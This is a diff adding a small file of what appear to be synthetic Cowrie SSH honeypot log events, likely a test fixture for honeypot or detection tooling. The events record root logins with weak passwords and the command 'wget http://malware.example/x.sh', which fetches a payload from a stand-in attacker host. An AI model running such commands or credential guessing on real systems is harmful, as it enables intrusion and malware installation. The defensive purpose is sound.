@@ -1,0 +1,5 @@
+{"eventid": "cowrie.session.connect", "src_ip": "203.0.113.10", "src_port": 51344, "dst_port": 22, "session": "a1b2c3", "protocol": "ssh", "timestamp": "2026-07-06T10:00:00Z"}
+{"eventid": "cowrie.login.failed", "src_ip": "203.0.113.10", "username": "root", "password": "123456", "session": "a1b2c3", "protocol": "ssh", "timestamp": "2026-07-06T10:00:01Z"}
+{"eventid": "cowrie.login.success", "src_ip": "203.0.113.10", "username": "root", "password": "admin", "session": "a1b2c3", "protocol": "ssh", "timestamp": "2026-07-06T10:00:02Z"}
+{"eventid": "cowrie.command.input", "src_ip": "203.0.113.10", "input": "wget http://malware.example/x.sh", "session": "a1b2c3", "protocol": "ssh", "timestamp": "2026-07-06T10:00:03Z"}
+{"eventid": "cowrie.session.file_download", "src_ip": "203.0.113.10", "url": "http://malware.example/x.sh", "shasum": "deadbeef", "session": "a1b2c3", "protocol": "ssh", "timestamp": "2026-07-06T10:00:04Z"}
